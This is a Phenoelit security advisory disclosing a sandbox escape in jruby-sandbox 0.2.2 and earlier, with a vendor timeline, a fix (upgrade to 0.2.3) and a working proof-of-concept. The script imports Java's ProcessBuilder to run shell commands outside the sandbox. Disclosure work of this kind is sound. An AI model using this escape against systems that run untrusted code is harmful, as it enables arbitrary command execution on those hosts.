@@ -1,0 +1,51 @@
+Phenoelit Advisory <wir-haben-auch-mal-was-gefunden #0815 +-+++>
+
+[ Authors ]
+        joernchen       <joernchen () phenoelit de>
+
+        Phenoelit Group (http://www.phenoelit.de)
+
+[ Affected Products ]
+        jruby-sandbox <= 0.2.2
+        https://github.com/omghax/jruby-sandbox
+
+[ Vendor communication ]
+        2014-04-22 Send vulnerability details to project maintainer
+        2014-04-24 Requesting confirmation that details were received
+        2014-04-24 Maintainer states he is working on a test case
+        2014-04-24 Maintainer releases fixed version
+        2014-04-24 Release of this advisory
+
+[ Description ]
+        jruby-sandbox aims to allow safe execution of user given Ruby
+        code within a JRuby [0] runtime. However via import of Java 
+        classes it is possible to circumvent those protections and 
+        execute arbitrary code outside the sandboxed environment.
+
+[ Example ]
+
+require 'sandbox'
+sand = Sandbox.safe
+sand.activate!
+
+begin
+  sand.eval("print `id`")
+rescue Exception => e
+  puts "fail via Ruby ;)"
+end
+puts "Now for some Java"
+
+sand.eval("Kernel.send :java_import, 'java.lang.ProcessBuilder'")
+sand.eval("Kernel.send :java_import, 'java.util.Scanner'")
+sand.eval("s = Java::java.util.Scanner.new( " + 
+          "Java::java.lang.ProcessBuilder.new('sh','-c','id')" + 
+          ".start.getInputStream  ).useDelimiter(\"\x00\").next")
+sand.eval("print s")
+
+[ Solution ]
+        Upgrade to version 0.2.3
+
+[ References ]
+        [0] http://jruby.org/
+
+[ end of file ]
